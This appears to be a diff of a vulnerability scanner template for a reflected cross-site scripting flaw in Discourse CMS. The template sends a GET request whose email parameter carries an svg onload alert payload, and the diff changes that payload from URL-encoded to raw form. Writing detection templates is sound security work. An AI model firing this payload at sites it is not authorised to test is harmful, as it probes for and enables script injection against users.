@@ -1,15 +1,14 @@
-id: discourse-xss
+id: Discourse-XSS
 
 info:
-  name: Discourse CMS - XSS
+  name: Discourse CMS XSS
   author: madrobot
   severity: medium
-  description: Cross-site scripting (XSS) on Discourse CMS
 
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E'
+      - '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\"><svg/onload=alert(1337)>'
     matchers-condition: and
     matchers:
       - type: status
